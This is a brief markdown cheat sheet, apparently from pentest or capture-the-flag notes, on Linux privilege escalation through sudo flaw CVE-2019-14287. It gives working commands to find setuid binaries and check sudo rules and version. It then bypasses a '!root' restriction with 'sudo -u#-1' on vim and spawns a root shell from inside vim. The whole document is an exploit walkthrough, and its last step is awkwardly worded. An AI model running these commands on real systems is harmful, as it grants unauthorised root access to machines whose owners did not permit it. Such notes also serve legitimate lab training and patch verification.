### Locate the Sudo 
```
find / -perm -4000 -type f 2>/dev/null
find / -name sudo -type f -executable 2>/dev/null 
```

### List Sudo Permissions
```
sudo -l
/usr/bin/sudo -l
/usr/local/bin/sudo -l
```
- User ***USER*** may run the following commands on server:
    (ALL, !root) /usr/bin/vim
    
### Sudo Version
```
/bin/sudo --version
/usr/local/bin/sudo --version
```
- CVE-2019-14287 affects version of Sudo prior to 1.8.28, so you're looking for version numbers lower than this.

**Add the `-u#-1` flag to your sudo command to launch the 'forbidden' binary as root**
```
/usr/local/bin/sudo -u#-1 /usr/bin/vim
```
- this will bring up a `vim` page.

**Save the file as**
```
:! /bin/bash
```
- `Do not write into the file with 'insert', but save the type the above command on the filename and enter.`